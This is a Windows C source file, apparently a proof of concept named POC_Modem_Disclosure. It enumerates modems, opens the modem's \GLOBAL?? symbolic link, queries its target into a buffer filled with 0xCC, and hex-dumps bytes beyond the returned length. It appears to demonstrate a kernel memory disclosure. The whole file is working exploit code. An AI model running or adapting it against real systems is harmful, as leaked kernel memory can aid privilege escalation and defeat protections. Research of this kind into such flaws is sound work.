#include "stdafx.h"
#include "windows.h"
#include "SetupAPI.h"
#include "Header.h"


const GUID GUID_DEVINTERFACE_MODEM = {0x2c7089aa, 0x2e0e, 0x11d1, {0xb1, 0x14, 0x00, 0xc0, 0x4f, 0xc2, 0xaa, 0xe4}};


int GetModemName(wchar_t* pModemName)
{
	HDEVINFO hDevInfo = 
	SetupDiGetClassDevs(&GUID_DEVINTERFACE_MODEM,0,0,DIGCF_PRESENT|DIGCF_DEVICEINTERFACE);

	if(hDevInfo == INVALID_HANDLE_VALUE)
	{
		printf("SetupDiGetClassDevs, err: %X\r\n",GetLastError());
		return -1;
	}

	printf("hDevInfo: %I64X\r\n",hDevInfo);

	unsigned long LastError = 0;
	unsigned long i = 0;
	while(LastError != ERROR_NO_MORE_ITEMS)
	{
		_SP_DEVINFO_DATA  SPDevInfo={0};
		SPDevInfo.cbSize =  sizeof(SPDevInfo);

		BOOL bRet = SetupDiEnumDeviceInfo(hDevInfo,i,&SPDevInfo);
		LastError = GetLastError();

		printf("SetupDiEnumDeviceInfo, bRet: %X, LastError: %X\r\n",bRet,LastError);

		if(!bRet) break;
		else
		{
			unsigned char* pBuffer = (unsigned char*)LocalAlloc(LMEM_ZEROINIT,0x200+0x2);
			unsigned long ReqSize = 0;

			if(SetupDiGetDeviceRegistryProperty(hDevInfo,
											&SPDevInfo,
											SPDRP_FRIENDLYNAME,
											0,
											pBuffer,
											0x200,
											&ReqSize))
			{
				wprintf(L"Friendly name: %s\r\n",pBuffer);
				wcscpy(pModemName,(wchar_t*)pBuffer);
				LocalFree(pBuffer);
				break;
			}
			LocalFree(pBuffer);
		}

		i++;
	}

	if(LastError == ERROR_NO_MORE_ITEMS)
	{
		printf("Done, enumerated %X items \r\n",i);
	}
	else
	{
		printf("Error while enumerating\r\n");
	}

	if(!SetupDiDestroyDeviceInfoList(hDevInfo))
	{
		printf("SetupDiDestroyDeviceInfoList, err: %X\r\n",GetLastError());
		return -10;
	}
	return 0;
}


void POC_Modem_Disclosure()
{
	wchar_t* ModemName = (wchar_t*)LocalAlloc(LMEM_ZEROINIT,0x102);
	if(!ModemName)
	{
		printf("Alloc error\r\n");
		return;
	}



	int retXYZZZZZ = GetModemName(ModemName);
	if(retXYZZZZZ < 0)
	{
		printf("Can't get modem name\r\n");
		LocalFree(ModemName);
		return;
	}
	else
	{
		wprintf(L"===> %s\r\n",ModemName);
	}

	wchar_t* SymName = (wchar_t*)LocalAlloc(LMEM_ZEROINIT,0x200);
	
	wcscat(SymName,L"\\GLOBAL??\\");
	wcscat(SymName,ModemName);

	LocalFree(ModemName);

	wprintf(L"%s\r\n",SymName);

	_UNICODE_STRING UNI_SL = {0};		
	UNI_SL.Length=wcslen(SymName)*2;
	UNI_SL.MaxLength= UNI_SL.Length + 2;
	UNI_SL.Buffer=SymName;
	_OBJECT_ATTRIBUTES ObjAttr_SL = {sizeof(ObjAttr_SL)};
	ObjAttr_SL.ObjectName=&UNI_SL;
	ObjAttr_SL.Attributes=0x40;
	HANDLE hSym = 0;
	int ret = ZwOpenSymbolicLinkObject(&hSym,GENERIC_READ,&ObjAttr_SL);
	printf("ZwOpenSymbolicLinkObject, ret: %X\r\n",ret);
	if(ret >= 0)
	{
		wchar_t* pTarget = (wchar_t*)LocalAlloc(LMEM_ZEROINIT,MAX_UNICODE_STRING_LENGTH);
		if(!pTarget)
		{
			printf("Error allocating memory for target name\r\n");
		}
		else
		{
			memset(pTarget,0xCC,MAX_UNICODE_STRING_LENGTH);
			_UNICODE_STRING uniTarget = {0};
			uniTarget.Length = MAX_UNICODE_STRING_LENGTH - 2;
			uniTarget.MaxLength = MAX_UNICODE_STRING_LENGTH;
			uniTarget.Buffer = pTarget;

			ulong RetLength = 0;
			ret = ZwQuerySymbolicLinkObject(hSym,&uniTarget,&RetLength);
			printf("ZwQuerySymbolicLinkObject, ret: %X\r\n",ret);
			if(ret >= 0)
			{
					printf("Length: %X\r\n",uniTarget.Length);
					printf("MaxLength: %X\r\n",RetLength);

					DumpHex(pTarget,RetLength+0x4);
			}
			LocalFree(pTarget);
		}
		ZwClose(hSym);
	}
	return;
}


int _tmain(int argc, _TCHAR* argv[])
{
	POC_Modem_Disclosure();
	return 0;
}

